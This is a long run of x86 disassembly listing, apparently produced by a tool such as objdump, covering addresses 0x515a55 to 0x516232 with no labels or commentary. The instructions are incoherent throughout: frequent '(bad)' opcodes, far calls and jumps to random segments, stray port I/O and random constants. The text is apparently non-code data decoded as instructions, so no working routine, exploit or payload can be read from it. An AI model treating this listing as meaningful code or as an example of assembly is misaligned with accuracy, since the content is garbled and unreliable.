  515a55:	shl    ebp,0xb8
  515a58:	and    BYTE PTR cs:[ebx+0x5a69fbab],ah
  515a5f:	xchg   edx,eax
  515a60:	ret    
  515a61:	(bad)  
  515a62:	(bad)  
  515a63:	(bad)  
  515a64:	icebp  
  515a65:	call   0x9917:0xff042792
  515a6c:	call   0x19ada169
  515a71:	xchg   ebp,eax
  515a72:	push   ebp
  515a73:	jmp    0x3bd2:0xa3636b2b
  515a7a:	jo     0x515afa
  515a7c:	fild   DWORD PTR [ecx-0x28d4df99]
  515a82:	in     al,dx
  515a83:	shr    BYTE PTR [edi+0x7e],0xf
  515a87:	mov    ch,0xb
  515a89:	clc    
  515a8a:	and    al,0x10
  515a8c:	in     al,0xee
  515a8e:	xor    bl,BYTE PTR [edi+ecx*4]
  515a91:	push   0xffffffc4
  515a93:	in     al,0xc0
  515a95:	sbb    cl,BYTE PTR [eax+eiz*4-0x79e71d9d]
  515a9c:	push   0xdc4e6230
  515aa1:	inc    eax
  515aa2:	mov    esi,esi
  515aa4:	sbb    dh,ah
  515aa6:	inc    esp
  515aa7:	or     BYTE PTR [eax+esi*8-0x4a],ch
  515aab:	jb     0x515a57
  515aad:	xchg   ecx,eax
  515aae:	xchg   edi,eax
  515aaf:	sub    DWORD PTR [edx+eiz*4],ebp
  515ab2:	shr    DWORD PTR [edi],cl
  515ab4:	pop    edi
  515ab5:	inc    eax
  515ab6:	pop    ss
  515ab7:	adc    al,0x27
  515ab9:	ret    0x775b
  515abc:	cmc    
  515abd:	stos   DWORD PTR es:[edi],eax
  515abe:	popf   
  515abf:	mov    ah,0x98
  515ac1:	pop    esi
  515ac2:	in     al,0xdb
  515ac4:	jno    0x515a4e
  515ac6:	pop    ds
  515ac7:	xor    BYTE PTR [eax],bl
  515ac9:	xor    dh,0x77
  515acc:	leave  
  515acd:	out    dx,al
  515ace:	scas   al,BYTE PTR es:[edi]
  515acf:	cmp    cl,dl
  515ad1:	jecxz  0x515a9b
  515ad3:	xchg   edx,eax
  515ad4:	scas   al,BYTE PTR es:[edi]
  515ad5:	pop    ebp
  515ad6:	pop    ax
  515ad8:	push   ebp
  515ad9:	ins    DWORD PTR es:[edi],dx
  515ada:	into   
  515adb:	cmp    bl,al
  515add:	mov    esi,0x350ea8e8
  515ae2:	add    ebx,DWORD PTR [esi*2+0x46b4fbfa]
  515ae9:	pop    ebx
  515aea:	pop    esp
  515aeb:	pop    es
  515aec:	and    DWORD PTR [ebx],ecx
  515aee:	mov    cl,0xa3
  515af0:	xor    eax,0x3d187b89
  515af5:	add    eax,0xe37f0ecb
  515afa:	pop    ecx
  515afb:	jne    0x515b6c
  515afd:	xchg   edx,eax
  515afe:	jne    0x515aee
  515b00:	jp     0x515a89
  515b02:	sub    al,0xf8
  515b04:	aad    0x5e
  515b06:	inc    eax
  515b07:	jb     0x515b20
  515b09:	jo     0x515ae0
  515b0b:	popf   
  515b0c:	cmp    DWORD PTR [eax-0x4a5d35bf],edx
  515b12:	xchg   edx,eax
  515b13:	dec    eax
  515b14:	(bad)  
  515b15:	mov    ds:0x9272acf7,eax
  515b1a:	fisttp DWORD PTR [ebx-0x4e1dfe27]
  515b20:	stos   DWORD PTR es:[edi],eax
  515b21:	outs   dx,BYTE PTR ds:[esi]
  515b22:	pusha  
  515b23:	in     eax,dx
  515b24:	leave  
  515b25:	mov    eax,ds:0x403cd9b8
  515b2a:	test   eax,0x91dcb2dd
  515b2f:	sbb    BYTE PTR [ebx],dl
  515b31:	outs   dx,DWORD PTR ds:[esi]
  515b32:	test   DWORD PTR [ecx+0x264f17d0],eax
  515b38:	push   0x8ecbe5ed
  515b3d:	stos   BYTE PTR es:[edi],al
  515b3e:	fsubr  DWORD PTR [edi+0x40580683]
  515b44:	push   ecx
  515b45:	pusha  
  515b46:	inc    esp
  515b47:	lods   eax,DWORD PTR ds:[esi]
  515b49:	sbb    DWORD PTR ds:0x846ff5a7,0x4c1f2739
  515b53:	aam    0x59
  515b55:	xchg   esi,eax
  515b56:	push   esp
  515b57:	in     al,0xd4
  515b59:	bound  ebx,QWORD PTR [ebx+0x6189a005]
  515b5f:	out    dx,al
  515b60:	mov    dh,0x41
  515b62:	sti    
  515b63:	sub    dl,al
  515b65:	test   eax,0xc6085b6a
  515b6a:	stos   BYTE PTR es:[edi],al
  515b6b:	pop    DWORD PTR [ebx+0x7fcde6a8]
  515b71:	mov    esp,0xea756947
  515b76:	push   es
  515b77:	xchg   ebx,eax
  515b78:	and    bl,BYTE PTR [bp+si+0x1b26]
  515b7d:	sbb    BYTE PTR [eax],dl
  515b7f:	int3   
  515b80:	retf   0x23a3
  515b83:	push   edx
  515b84:	ja     0x515b31
  515b86:	jne    0x515bfa
  515b88:	data16 fsubrp st(7),st
  515b8b:	into   
  515b8c:	adc    eax,0xba3a5f40
  515b91:	mov    ecx,0xca8c03be
  515b96:	jmp    0x515c11
  515b98:	lock addr16 jl 0x515b9b
  515b9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  515b9d:	and    BYTE PTR [esi-0x2c],dh
  515ba0:	sub    eax,DWORD PTR [bx-0x6112]
  515ba5:	xor    ebx,edx
  515ba7:	jbe    0x515b92
  515ba9:	xchg   ebp,eax
  515baa:	push   edi
  515bab:	ja     0x515b48
  515bad:	call   0x4340:0x8b54ed64
  515bb4:	pop    es
  515bb5:	and    eax,0xf0ca8874
  515bba:	test   eax,0xd3b4a34d
  515bbf:	loop   0x515bf9
  515bc1:	and    ebp,DWORD PTR [esi-0x53]
  515bc4:	and    dh,dh
  515bc6:	mov    bh,bh
  515bc8:	retf   0xa6c
  515bcb:	in     eax,dx
  515bcc:	jae    0x515c41
  515bce:	jg     0x515b77
  515bd0:	ja     0x515b94
  515bd2:	pop    eax
  515bd3:	aas    
  515bd4:	mov    ebp,0x12fb103e
  515bd9:	cwde   
  515bda:	call   0x73d9:0xf0eea6d6
  515be1:	jb     0x515b9f
  515be3:	pop    ds
  515be4:	or     DWORD PTR [ebx-0x30],edx
  515be7:	xchg   esi,eax
  515be8:	mov    bl,0x3a
  515bea:	xchg   edi,eax
  515beb:	jno    0x515b89
  515bed:	lods   al,BYTE PTR ds:[esi]
  515bee:	loope  0x515c5a
  515bf0:	pushf  
  515bf1:	sahf   
  515bf2:	loop   0x515c33
  515bf4:	lds    ebp,FWORD PTR [eax]
  515bf6:	jge    0x515c16
  515bf8:	jg     0x515bb2
  515bfa:	pop    esp
  515bfb:	aam    0x52
  515bfd:	in     eax,0x86
  515bff:	dec    ecx
  515c00:	mov    al,0x1f
  515c02:	lea    eax,[ebp-0x423b2b38]
  515c08:	xchg   edi,eax
  515c09:	jge    0x515c5e
  515c0b:	cmp    dl,ch
  515c0d:	repnz pop edx
  515c0f:	mov    WORD PTR [edx],fs
  515c11:	ja     0x515bd4
  515c13:	fmulp  st(2),st
  515c15:	sbb    al,0x67
  515c17:	dec    esp
  515c18:	ss mov ch,0xd6
  515c1b:	cmc    
  515c1c:	rol    DWORD PTR [ebp+0x67b83d5e],1
  515c22:	(bad)  
  515c24:	test   al,0xf0
  515c26:	dec    BYTE PTR [ecx+0x1d]
  515c29:	jae    0x515c09
  515c2b:	outs   dx,BYTE PTR ds:[esi]
  515c2c:	loope  0x515c44
  515c2e:	dec    edi
  515c2f:	push   ss
  515c30:	jbe    0x515bbb
  515c32:	sub    ah,BYTE PTR [edi-0x515061a4]
  515c38:	jg     0x515c46
  515c3a:	inc    ebx
  515c3b:	jl     0x515cb2
  515c3d:	cmp    DWORD PTR [esi-0x10],edi
  515c40:	imul   edi,edx,0x45ce69fc
  515c46:	or     eax,DWORD PTR [esi]
  515c48:	and    cl,0x1d
  515c4b:	xchg   esi,eax
  515c4c:	or     DWORD PTR fs:[esi],eax
  515c4f:	push   ebx
  515c50:	sub    al,0x37
  515c52:	leave  
  515c53:	push   esp
  515c54:	gs fcmovnu st,st(6)
  515c57:	stc    
  515c58:	call   0x7b8824df
  515c5d:	fucomip st,st(2)
  515c5f:	and    eax,0xf83d29bc
  515c64:	outs   dx,BYTE PTR ds:[esi]
  515c65:	sbb    al,0x1a
  515c67:	push   edx
  515c68:	or     eax,0x86ac89b2
  515c6d:	sub    eax,0xb5c318ab
  515c72:	dec    esi
  515c73:	scas   eax,DWORD PTR es:[edi]
  515c74:	shl    dl,0x3d
  515c77:	(bad)  
  515c78:	shr    DWORD PTR [edi+0x36015190],1
  515c7e:	xchg   dh,dl
  515c80:	lea    ecx,[eax+edx*2]
  515c83:	jnp    0x515cb4
  515c85:	jle    0x515c51
  515c87:	inc    edx
  515c88:	fs call 0x88:0xcccb6dcb
  515c90:	int3   
  515c91:	aam    0xe
  515c93:	dec    esp
  515c94:	sar    BYTE PTR [esi+0x510284a9],0x49
  515c9b:	cmp    al,ah
  515c9d:	ror    ch,cl
  515c9f:	(bad)  
  515ca0:	iret   
  515ca1:	js     0x515ca4
  515ca3:	bound  eax,QWORD PTR [eax+edi*2+0x75b38e2d]
  515caa:	adc    al,0xcf
  515cac:	xor    DWORD PTR [ebp+0x12],ebp
  515caf:	retf   0x1b43
  515cb2:	mov    ebx,0x91a0d3d8
  515cb7:	iret   
  515cb8:	gs mov ebx,0x58fd5668
  515cbe:	inc    esi
  515cbf:	call   0xe307:0xb676b94e
  515cc6:	lahf   
  515cc7:	sub    BYTE PTR [eax+0x287343bf],dh
  515ccd:	psrad  mm6,QWORD PTR [ecx]
  515cd0:	je     0x515cf7
  515cd2:	jmp    0xa37b8a7d
  515cd7:	xor    al,0x56
  515cd9:	ret    
  515cda:	push   ebx
  515cdb:	lock in eax,dx
  515cdd:	inc    edi
  515cde:	not    DWORD PTR [edx+0x5c]
  515ce1:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  515ce3:	retf   
  515ce4:	std    
  515ce5:	sahf   
  515ce6:	out    0x1e,al
  515ce8:	add    eax,0x243bdc44
  515ced:	popa   
  515cee:	outs   dx,BYTE PTR ds:[si]
  515cf0:	in     eax,0x11
  515cf2:	ins    DWORD PTR es:[edi],dx
  515cf3:	enter  0x63ad,0x9c
  515cf7:	test   DWORD PTR [ecx+eax*8+0x3f],ecx
  515cfb:	ror    DWORD PTR [ebp-0x5db2831b],1
  515d01:	loopne 0x515d5a
  515d03:	and    dl,BYTE PTR [ebp-0xb]
  515d06:	add    dh,ah
  515d08:	int3   
  515d09:	xor    al,0x25
  515d0b:	jecxz  0x515ce3
  515d0d:	aad    0xa3
  515d0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  515d10:	sbb    dl,BYTE PTR [ebx]
  515d12:	mov    WORD PTR [ebx+0x24],?
  515d15:	ja     0x515ce9
  515d17:	in     al,dx
  515d18:	arpl   WORD PTR [eax+edx*2-0x3d569a81],bx
  515d1f:	lds    ebp,FWORD PTR [ebp+0x67da9882]
  515d25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  515d26:	lahf   
  515d27:	mov    ch,0x49
  515d29:	outs   dx,BYTE PTR ds:[esi]
  515d2a:	cs test eax,0x606d8a77
  515d30:	sar    DWORD PTR cs:[eax-0x24],1
  515d34:	or     al,0x95
  515d36:	arpl   sp,si
  515d38:	adc    DWORD PTR [edi-0x649c4c63],0xfffffff5
  515d3f:	nop
  515d40:	mov    ds:0xbfd1e895,al
  515d45:	mov    eax,ds:0xa94c08b7
  515d4a:	or     BYTE PTR [ebx+edi*2-0x6e394318],0x80
  515d52:	add    DWORD PTR [ebx-0x32],edx
  515d55:	jmp    0xc07c23fb
  515d5a:	push   0x74
  515d5c:	bound  eax,QWORD PTR [ebp-0x7bfb644c]
  515d62:	mov    ah,0x5a
  515d64:	xchg   edi,eax
  515d65:	in     al,dx
  515d66:	dec    ecx
  515d67:	add    BYTE PTR [eax+0x5d7b73dc],ah
  515d6d:	daa    
  515d6e:	cmp    esi,edx
  515d70:	pop    ecx
  515d71:	push   0xa9462327
  515d76:	data16 cmp cl,BYTE PTR [ebx+0x559cda9f]
  515d7d:	push   esp
  515d7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  515d7f:	add    cl,al
  515d81:	or     edx,0x2e
  515d84:	out    0x25,al
  515d86:	loop   0x515dde
  515d88:	fldcw  WORD PTR [ecx]
  515d8a:	mov    dl,0x41
  515d8c:	mov    bh,0x79
  515d8e:	repnz pop ecx
  515d90:	pushf  
  515d91:	jg     0x515e12
  515d93:	ret    
  515d94:	mov    ebx,0xbaf9074d
  515d99:	sbb    DWORD PTR [edx+0x20f12c61],esi
  515d9f:	pusha  
  515da0:	mov    dh,0x31
  515da2:	sub    cl,BYTE PTR [edx+0x1a]
  515da5:	lahf   
  515da6:	outs   dx,DWORD PTR ds:[esi]
  515da7:	adc    DWORD PTR [eax-0x17ca64e1],0xddadcf11
  515db1:	cli    
  515db2:	mov    eax,ds:0xa70918ab
  515db7:	sahf   
  515db8:	cli    
  515db9:	or     al,0x5d
  515dbb:	add    al,ch
  515dbd:	shl    BYTE PTR [esi+ecx*2-0x58],cl
  515dc1:	push   edi
  515dc2:	inc    eax
  515dc3:	shr    DWORD PTR [edx-0x63],cl
  515dc6:	xor    dh,cl
  515dc8:	sti    
  515dc9:	pop    ebx
  515dca:	dec    edi
  515dcb:	ds push cs
  515dcd:	icebp  
  515dce:	sbb    edx,DWORD PTR [ecx]
  515dd0:	retf   0xa146
  515dd3:	inc    ebp
  515dd4:	and    eax,0xe68b4ac0
  515dd9:	in     al,0xfa
  515ddb:	push   ebp
  515ddc:	mov    dh,0xea
  515dde:	shr    BYTE PTR [edx],1
  515de0:	cmp    ch,ch
  515de2:	je     0x515de9
  515de4:	push   ebp
  515de5:	pop    ebx
  515de6:	xchg   BYTE PTR [ecx-0x4c],cl
  515de9:	sub    bl,BYTE PTR [esi+0x5fd65922]
  515def:	jns    0x515e3e
  515df1:	(bad)  
  515df2:	xor    eax,0xfedf1ad9
  515df7:	rcr    BYTE PTR [edi-0x77],1
  515dfa:	fs mov fs,eax
  515dfd:	(bad)  
  515dfe:	sbb    DWORD PTR [ebx],ecx
  515e00:	cmp    eax,0x3f672793
  515e05:	fild   WORD PTR [esi-0xbf613d9]
  515e0b:	mov    bl,0xed
  515e0d:	pop    ebp
  515e0e:	mov    bh,0xd1
  515e10:	out    dx,al
  515e11:	mov    BYTE PTR [ecx+0x308b3196],dl
  515e17:	aad    0xca
  515e19:	mov    edi,0x26f8718a
  515e1e:	vpsrlq ymm7,ymm4,XMMWORD PTR [eax]
  515e23:	mov    ds:0x6401edba,eax
  515e28:	add    eax,0x6aef7ac0
  515e2d:	push   0x1a
  515e2f:	(bad)  
  515e30:	jmp    0x4821:0x9069835
  515e37:	(bad)  
  515e38:	call   0x6cf9f24f
  515e3d:	scas   eax,DWORD PTR es:[edi]
  515e3e:	mov    ds:0xdcc043f9,al
  515e43:	hlt    
  515e44:	shl    DWORD PTR ss:[edx],0x7a
  515e48:	xchg   BYTE PTR [edx],bl
  515e4a:	xlat   BYTE PTR ds:[ebx]
  515e4b:	inc    ecx
  515e4c:	ds pop ss
  515e4e:	(bad)  
  515e4f:	addr16 es mov eax,0x8338b99
  515e56:	push   0x3041edd8
  515e5b:	mov    bl,0x71
  515e5d:	fild   DWORD PTR gs:[ecx+0x58]
  515e61:	lds    esp,FWORD PTR [eax+0x22]
  515e64:	and    dl,BYTE PTR [ebp+0x6aea66d3]
  515e6a:	push   eax
  515e6b:	inc    ecx
  515e6c:	pop    ecx
  515e6d:	push   edi
  515e6e:	push   esi
  515e6f:	sbb    BYTE PTR [ecx-0x58fe25f1],ah
  515e75:	(bad)  
  515e76:	fld    TBYTE PTR [esi-0x15]
  515e79:	pop    edi
  515e7a:	rol    DWORD PTR [esp+eax*1],0x5
  515e7e:	mov    esp,0xfa519573
  515e83:	mov    ecx,0x6a0357ae
  515e88:	lds    ecx,FWORD PTR ds:0xac8f0db4
  515e8e:	adc    esi,esi
  515e90:	in     al,0x7f
  515e92:	xchg   BYTE PTR [ecx-0x30],dh
  515e95:	std    
  515e96:	es push es
  515e98:	rcl    cl,0xdf
  515e9b:	mov    ebx,0xc0a91b7a
  515ea0:	sub    esi,DWORD PTR [esi-0x7b4ad1df]
  515ea6:	aas    
  515ea7:	or     DWORD PTR ds:0x4375f0f0,edi
  515ead:	enter  0x4a98,0xb7
  515eb1:	sbb    dh,BYTE PTR [edx+0x3cfbfdff]
  515eb7:	out    dx,al
  515eb8:	into   
  515eb9:	cwde   
  515eba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  515ebb:	sahf   
  515ebc:	test   esp,esi
  515ebe:	outs   dx,BYTE PTR ds:[esi]
  515ebf:	mov    edx,0x54f6e62a
  515ec4:	cmp    ebp,DWORD PTR ds:0x5664d82a
  515eca:	mov    ds:0xa07a5154,eax
  515ecf:	adc    eax,0xdec963da
  515ed4:	push   edx
  515ed5:	jmp    0xaf7a:0xa5b4460e
  515edc:	ficomp DWORD PTR [edx+esi*2-0x33]
  515ee0:	imul   ebx,DWORD PTR [esp+edx*4],0x119bd2df
  515ee7:	adc    eax,0x7fe21dbf
  515eec:	ss pop ebp
  515eee:	jp     0x515f53
  515ef0:	or     al,0x7b
  515ef2:	retf   
  515ef3:	mov    esp,0x6d1c3a3c
  515ef8:	outs   dx,BYTE PTR ds:[esi]
  515ef9:	jle    0x515eff
  515efb:	xor    ah,ch
  515efd:	pop    ebx
  515efe:	mov    ds:0xbfdf0e40,eax
  515f03:	and    eax,0x6342bc97
  515f08:	push   edx
  515f09:	and    DWORD PTR [edx-0x5d],0xffffffc5
  515f0d:	or     ebx,DWORD PTR [esi+0x73]
  515f10:	push   0xffffff86
  515f12:	test   DWORD PTR [ebp-0x50],ecx
  515f15:	mov    eax,DWORD PTR ds:0xd571640e
  515f1b:	(bad)  
  515f1d:	mov    ch,0xd8
  515f1f:	jno    0x515f71
  515f21:	dec    edx
  515f22:	mov    cl,0x3d
  515f24:	pusha  
  515f25:	jecxz  0x515eea
  515f27:	xor    DWORD PTR [edx+0x5395353a],esi
  515f2d:	outs   dx,BYTE PTR ds:[esi]
  515f2e:	adc    BYTE PTR [ebx+0x33ea4630],dh
  515f34:	pop    eax
  515f35:	in     al,0xa4
  515f37:	aaa    
  515f38:	and    DWORD PTR [esi],ecx
  515f3a:	cld    
  515f3b:	stc    
  515f3c:	adc    BYTE PTR [ecx+0x56985ed],0xe
  515f43:	xchg   esp,eax
  515f44:	xchg   BYTE PTR [edx+edx*4+0x35c24a42],cl
  515f4b:	inc    eax
  515f4c:	dec    esp
  515f4d:	fcomip st,st(2)
  515f4f:	(bad)  
  515f51:	jne    0x515f23
  515f53:	adc    bl,BYTE PTR [ebx-0x291df31d]
  515f59:	fcom   DWORD PTR [ecx+0x3b7a71a8]
  515f5f:	cmp    BYTE PTR [edx+0x631617c9],bh
  515f65:	in     eax,dx
  515f66:	dec    ecx
  515f67:	pop    esi
  515f68:	mov    edx,0x583c2732
  515f6d:	pop    ebx
  515f6e:	(bad)  
  515f6f:	push   edi
  515f70:	push   ecx
  515f72:	add    al,BYTE PTR [edx]
  515f74:	retf   0xdbe8
  515f77:	bound  esi,QWORD PTR [eax+0x17]
  515f7a:	int    0x83
  515f7c:	inc    DWORD PTR [edx]
  515f7e:	push   ebp
  515f7f:	out    dx,al
  515f80:	das    
  515f81:	retf   0xdec7
  515f84:	mov    BYTE PTR [eax],dh
  515f86:	pop    esp
  515f87:	xchg   ebp,eax
  515f88:	ret    0xa1e8
  515f8b:	jge    0x516003
  515f8d:	mov    eax,ds:0xea3599b3
  515f92:	adc    ebp,DWORD PTR [edx]
  515f94:	(bad)  
  515f95:	cld    
  515f96:	clc    
  515f97:	test   DWORD PTR [eax-0x51],ecx
  515f9a:	xchg   edi,eax
  515f9b:	adc    al,0x65
  515f9d:	jno    0x515f64
  515f9f:	lods   al,BYTE PTR ds:[esi]
  515fa0:	out    0x45,al
  515fa2:	cmp    DWORD PTR [edi-0x1c],ebp
  515fa5:	jno    0x515f89
  515fa7:	push   cs
  515fa8:	add    esi,DWORD PTR [edx-0x1]
  515fab:	imul   ebp,DWORD PTR [esi+edi*1+0x19],0x3e
  515fb0:	popa   
  515fb1:	fisub  DWORD PTR [ecx+0x11]
  515fb4:	mov    eax,ds:0x32f5fafe
  515fb9:	pop    eax
  515fba:	adc    al,0xab
  515fbc:	add    BYTE PTR [eax-0x1b485bd5],bh
  515fc2:	sbb    ebx,DWORD PTR [eax+esi*1-0x31e4b018]
  515fc9:	cwde   
  515fca:	jg     0x516017
  515fcc:	xor    edi,DWORD PTR [edi-0x2c9a3609]
  515fd2:	pop    eax
  515fd3:	inc    esi
  515fd4:	ret    0x1d2c
  515fd7:	sti    
  515fd8:	das    
  515fd9:	add    BYTE PTR [eax],cl
  515fdb:	loop   0x516041
  515fdd:	mov    esp,ds
  515fdf:	mov    al,fs:0xa95054c8
  515fe5:	into   
  515fe6:	and    eax,0x6e5406c3
  515feb:	fs mov edx,0x953e8e8d
  515ff1:	or     BYTE PTR [edx],bh
  515ff3:	push   cs
  515ff4:	stos   DWORD PTR es:[edi],eax
  515ff5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  515ff6:	mov    ch,0xaa
  515ff8:	out    0xa1,al
  515ffa:	pop    ebp
  515ffb:	rcr    BYTE PTR [eax+ebx*2],1
  515ffe:	imul   ebx,DWORD PTR [esp+ebp*8-0x7d],0x181a741d
  516006:	xchg   ecx,eax
  516007:	(bad)  
  516008:	xlat   BYTE PTR ds:[ebx]
  516009:	sub    BYTE PTR [eax-0x53],bl
  51600c:	xor    eax,0x445c85a9
  516011:	das    
  516012:	jecxz  0x51600b
  516014:	aam    0xf4
  516016:	and    BYTE PTR [ebp+edx*4+0x4c],0x68
  51601b:	stc    
  51601c:	enter  0x6504,0xca
  516020:	jmp    0xfd59efaa
  516025:	adc    DWORD PTR [edi-0x6c],ebx
  516028:	lock icebp 
  51602a:	and    ah,dl
  51602c:	xchg   esi,eax
  51602d:	cli    
  51602e:	mov    esp,0x49def15a
  516033:	xchg   BYTE PTR [ecx],ch
  516035:	cmp    ebp,DWORD PTR [ebp+0x199e5272]
  51603b:	out    0x9a,al
  51603d:	pop    ebp
  51603e:	add    eax,0xcc8e8bc9
  516043:	cmp    ebp,DWORD PTR [edx+0x48]
  516046:	and    ecx,DWORD PTR [ebx-0x76]
  516049:	inc    edi
  51604a:	xor    DWORD PTR [edi+0x56],esi
  51604d:	or     al,0x1b
  51604f:	push   ebp
  516050:	dec    ebx
  516051:	lods   al,BYTE PTR ds:[esi]
  516052:	int    0x84
  516054:	gs push ss
  516056:	popa   
  516057:	jbe    0x516019
  516059:	xchg   bh,cl
  51605b:	or     edi,DWORD PTR [eax+0x8]
  51605e:	xor    al,0xf4
  516060:	mov    eax,ds:0x920daba9
  516065:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  516067:	repz hlt 
  516069:	stos   DWORD PTR es:[edi],eax
  51606a:	lods   al,BYTE PTR ds:[esi]
  51606b:	aaa    
  51606c:	xchg   ebp,eax
  51606d:	cli    
  51606e:	test   DWORD PTR [esi+0x67e63f],edx
  516074:	daa    
  516075:	fmul   DWORD PTR [esi-0x63]
  516078:	and    DWORD PTR [edx+0x41],ebp
  51607b:	adc    eax,0x3275f797
  516080:	out    dx,al
  516081:	push   ecx
  516082:	mov    ch,0x74
  516084:	inc    ebx
  516085:	inc    ecx
  516086:	sti    
  516087:	and    dh,BYTE PTR [ecx-0x28]
  51608a:	or     BYTE PTR [eax+0x3f],0x84
  51608e:	stos   BYTE PTR es:[edi],al
  51608f:	push   ebp
  516090:	adc    dh,BYTE PTR [edi-0x79]
  516093:	js     0x516098
  516095:	pop    ebx
  516096:	mov    ds:0xffa0572,al
  51609b:	daa    
  51609c:	icebp  
  51609d:	adc    eax,0xfcc19ad1
  5160a2:	arpl   WORD PTR [edx+ecx*2+0x55978cdc],di
  5160a9:	xor    ecx,esp
  5160ab:	lds    ecx,FWORD PTR [edx-0x26]
  5160ae:	add    BYTE PTR [edx+0x38],al
  5160b1:	leave  
  5160b2:	cmp    al,0xe1
  5160b4:	jmp    0xcba3ca48
  5160b9:	mov    eax,0xf476e1fa
  5160be:	nop
  5160bf:	pop    es
  5160c0:	test   BYTE PTR [ecx],ch
  5160c2:	mov    dh,0x3a
  5160c4:	test   BYTE PTR [ecx],bl
  5160c6:	int    0x98
  5160c8:	(bad)  
  5160c9:	stos   DWORD PTR es:[edi],eax
  5160ca:	icebp  
  5160cb:	jecxz  0x516064
  5160cd:	mov    ecx,0xaa174bf4
  5160d2:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5160d4:	jne    0x516121
  5160d6:	out    dx,eax
  5160d7:	and    al,0x1f
  5160d9:	and    eax,0x1cc2adfd
  5160de:	add    ch,BYTE PTR [ebp-0x71968c02]
  5160e4:	(bad)
  5160e7:	frstor [ebx-0x15]
  5160ea:	idiv   ebp
  5160ec:	sub    BYTE PTR [eax-0x5426a0d5],al
  5160f2:	(bad)  
  5160f3:	mov    ecx,0xa509fc7a
  5160f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5160f9:	or     eax,0x4bec158a
  5160fe:	push   edx
  5160ff:	pop    eax
  516100:	mov    BYTE PTR [ecx-0x5ac4a472],ch
  516106:	ins    DWORD PTR es:[edi],dx
  516107:	xchg   ebx,eax
  516108:	push   esi
  516109:	stos   DWORD PTR es:[edi],eax
  51610a:	stos   DWORD PTR es:[edi],eax
  51610b:	push   edi
  51610c:	inc    edx
  51610d:	andps  xmm2,xmm4
  516110:	mov    eax,ds:0xe507f162
  516115:	in     al,0x8e
  516117:	jmp    0x516108
  516119:	rcl    DWORD PTR [esi+0x1a],0xcf
  51611d:	add    DWORD PTR [eax],esi
  51611f:	push   0xffffffde
  516121:	test   DWORD PTR [esi+edx*2-0x691a5aff],0x115f78b5
  51612c:	scas   al,BYTE PTR es:[edi]
  51612d:	inc    ebp
  51612e:	(bad)  
  51612f:	out    dx,eax
  516130:	ret    0xf10f
  516133:	xchg   esi,eax
  516134:	mov    edi,0xbd4f8043
  516139:	jmp    0x51611f
  51613b:	push   0x7
  51613d:	imul   DWORD PTR [ecx+0x432c0bd7]
  516143:	ret    0x1232
  516146:	inc    esi
  516147:	cli    
  516148:	retf   0x338
  51614b:	and    al,0xce
  51614d:	pop    ds
  51614e:	in     al,dx
  51614f:	push   ds
  516150:	cmp    eax,0xe2eecd7b
  516155:	push   ebp
  516156:	je     0x51617f
  516158:	mov    edi,0x92a90384
  51615d:	out    dx,al
  51615e:	aad    0xeb
  516160:	mov    ch,BYTE PTR [edi+0x53]
  516163:	pop    esp
  516164:	ret    
  516165:	pop    esi
  516166:	sbb    BYTE PTR [edx+eax*8+0x33ba51a7],0xcc
  51616e:	push   esp
  51616f:	xchg   esi,eax
  516170:	shl    BYTE PTR gs:[eax-0x19],cl
  516174:	jb     0x51618b
  516176:	lea    eax,[ecx]
  516178:	xchg   edx,eax
  516179:	fdiv   QWORD PTR [edx]
  51617b:	in     eax,dx
  51617c:	xor    esp,DWORD PTR [ebp+ebx*1+0x521fc186]
  516183:	mov    al,0xfa
  516185:	arpl   WORD PTR [edx-0x4e],bp
  516188:	or     BYTE PTR [eax+0x15c6a40c],cl
  51618e:	mov    BYTE PTR [esi-0x72],bh
  516191:	or     BYTE PTR [esi],al
  516193:	jns    0x516170
  516195:	out    0xa9,al
  516197:	xchg   DWORD PTR [eax],esp
  516199:	push   ss
  51619a:	push   0xffffffb1
  51619c:	sub    dl,ch
  51619e:	into   
  51619f:	jmp    0x5161f9
  5161a1:	(bad)  [ecx+0x34bf0963]
  5161a7:	stc    
  5161a8:	or     dl,BYTE PTR [eax+0x13]
  5161ab:	pop    ss
  5161ac:	fldcw  WORD PTR [edx+0xa]
  5161af:	xchg   edi,eax
  5161b0:	(bad)  
  5161b1:	int    0x26
  5161b3:	xor    al,0x19
  5161b5:	xchg   edi,eax
  5161b6:	int3   
  5161b7:	int    0xa2
  5161b9:	call   0x1f48:0x1446fd60
  5161c0:	fidiv  DWORD PTR [esi]
  5161c2:	mov    bl,0xd
  5161c4:	dec    ecx
  5161c5:	inc    esp
  5161c6:	dec    ebp
  5161c7:	rcl    DWORD PTR ds:0x5e3d7717,0x3f
  5161ce:	and    eax,DWORD PTR [esp+eiz*2+0x4a]
  5161d2:	leave  
  5161d3:	pop    es
  5161d4:	pop    ebp
  5161d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  5161d6:	xchg   ebp,eax
  5161d7:	fsubr  DWORD PTR [esi-0xf1f3349]
  5161dd:	jg     0x516226
  5161df:	mov    ds:0x382dfe45,eax
  5161e4:	call   0x61fb:0xb4dfbcff
  5161eb:	fst    DWORD PTR [ebx]
  5161ed:	retf   
  5161ee:	les    ebp,FWORD PTR [edx+0x1a92b27d]
  5161f4:	add    al,0xc9
  5161f6:	mov    ch,0x1a
  5161f8:	call   FWORD PTR [ebx]
  5161fa:	adc    eax,0x3d61d361
  5161ff:	fs cli 
  516201:	punpckhwd mm6,mm5
  516204:	or     al,0x9f
  516206:	mov    ebx,DWORD PTR [edx]
  516208:	pushf  
  516209:	xchg   ebp,eax
  51620a:	push   0xf967e937
  51620f:	retf   
  516210:	cmovp  ebx,DWORD PTR [esi]
  516213:	ins    BYTE PTR es:[edi],dx
  516214:	enter  0x3a92,0xbd
  516218:	add    al,0x5d
  51621a:	addr16 adc eax,0x3bcbbde5
  516220:	add    DWORD PTR [eax],edx
  516222:	inc    edx
  516223:	xchg   esp,eax
  516224:	mov    ds:0xc0ba9643,eax
  516229:	enter  0x3add,0xb
  51622d:	mov    ebp,0x6c8ea648
  516232:	lea    ecx,[ebp-0x5d]
